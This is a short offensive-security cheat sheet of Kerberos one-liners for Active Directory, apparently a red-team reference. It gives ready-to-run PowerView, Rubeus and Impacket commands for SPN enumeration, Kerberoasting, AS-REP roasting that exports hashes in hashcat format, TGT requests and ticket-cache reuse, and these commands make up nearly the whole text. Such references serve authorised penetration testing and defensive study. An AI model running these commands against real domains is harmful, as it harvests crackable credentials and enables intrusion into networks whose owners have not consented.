# Kerberos

One-liners for common Kerberos discovery and testing workflows.

### Find SPNs

```powershell
Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
```

**Tool:** PowerView · **Platform:** Windows · **Tags:** Kerberos, SPN

### Kerberoast with Rubeus

```powershell
Rubeus.exe kerberoast /outfile:kerberoast.txt
```

**Tool:** Rubeus · **Platform:** Windows · **Tags:** Kerberos, Kerberoasting

### Kerberoast with Impacket

```bash
GetUserSPNs.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, Kerberoasting

### AS-REP roast with Rubeus

```powershell
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

**Tool:** Rubeus · **Platform:** Windows · **Tags:** Kerberos, AS-REP

### AS-REP roast with Impacket

```bash
GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, AS-REP

### Request TGT

```bash
getTGT.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
```

**Tool:** Impacket · **Platform:** Linux · **Tags:** Kerberos, TGT

### Use Kerberos cache

```bash
export KRB5CCNAME=$(pwd)/<USER>.ccache
```

**Tool:** Kerberos · **Platform:** Linux · **Tags:** Kerberos, ccache

### List Kerberos tickets

```bash
klist
```

**Tool:** Kerberos · **Platform:** Linux/Windows · **Tags:** Kerberos, Tickets

